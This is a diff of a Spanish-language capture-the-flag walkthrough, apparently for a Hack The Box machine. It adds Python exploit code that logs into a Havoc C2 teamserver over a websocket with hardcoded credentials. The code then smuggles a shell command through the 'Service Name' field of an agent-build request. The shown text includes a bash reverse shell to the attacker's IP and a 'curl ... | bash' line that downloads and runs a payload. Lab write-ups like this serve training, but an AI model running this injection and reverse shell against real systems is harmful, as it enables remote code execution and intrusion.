@@ -310,7 +310,43 @@ Modificaremos el script `payload.sh` para que la shell que contiene dentro, apun
 bash -i /dev/tcp/10.10.14.99/4444 0>&1 # Reemplaza por tu IP de HTB
 ~~~
 
-Modificaremos el exploit para agregar el siguiente contenido después de la línea `221` (`open_socket`)
+Modificaremos el exploit para agregar el siguiente contenido después de la línea `211` (`open_socket`)
+
+~~~ python
+...
+...
+USER = "ilya"
+PASSWORD = "CobaltStr1keSuckz!"
+host = "127.0.0.1"
+port = 40056
+
+websocket_request = create_websocket_request(host, port)
+print("[+] Writing socket...")
+write_socket(socket_id, websocket_request)
+response = read_socket(socket_id)
+
+
+payload = {"Body": {"Info": {"Password": hashlib.sha3_256(PASSWORD.encode()).hexdigest(), "User": USER}, "SubEvent": 3}, "Head": {"Event": 1, "OneTime": "", "Time": "18:40:17", "User": USER}}
+payload_json = json.dumps(payload)
+frame = build_websocket_frame(payload_json)
+write_socket(socket_id, frame)
+response = read_socket(socket_id)
+
+payload = {"Body":{"Info":{"Headers":"","HostBind":"0.0.0.0","HostHeader":"","HostRotation":"round-robin","Hosts":"0.0.0.0","Name":"abc","PortBind":"443","PortConn":"443","Protocol":"Https","Proxy Enabled":"false","Secure":"true","Status":"online","Uris":"","UserAgent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},"SubEvent":1},"Head":{"Event":2,"OneTime":"","Time":"08:39:18","User": USER}}
+payload_json = json.dumps(payload)
+frame = build_websocket_frame(payload_json)
+write_socket(socket_id, frame)
+response = read_socket(socket_id)
+
+cmd = "curl http://10.10.14.99/payload.sh | bash" # Agrega tu IP de HTB
+injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""
+payload = {"Body": {"Info": {"AgentType": "Demon", "Arch": "x64", "Config": "{\n    \"Amsi/Etw Patch\": \"None\",\n    \"Indirect Syscall\": false,\n    \"Injection\": {\n        \"Alloc\": \"Native/Syscall\",\n        \"Execute\": \"Native/Syscall\",\n        \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n        \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n    },\n    \"Jitter\": \"0\",\n    \"Proxy Loading\": \"None (LdrLoadDll)\",\n    \"Service Name\":\"" + injection + "\",\n    \"Sleep\": \"2\",\n    \"Sleep Jmp Gadget\": \"None\",\n    \"Sleep Technique\": \"WaitForSingleObjectEx\",\n    \"Stack Duplication\": false\n}\n", "Format": "Windows Service Exe", "Listener": "abc"}, "SubEvent": 2}, "Head": {
+"Event": 5, "OneTime": "true", "Time": "18:39:04", "User": USER}}
+payload_json = json.dumps(payload)
+frame = build_websocket_frame(payload_json)
+write_socket(socket_id, frame)
+response = read_socket(socket_id)
+~~~
 
 ### Exploiting
 
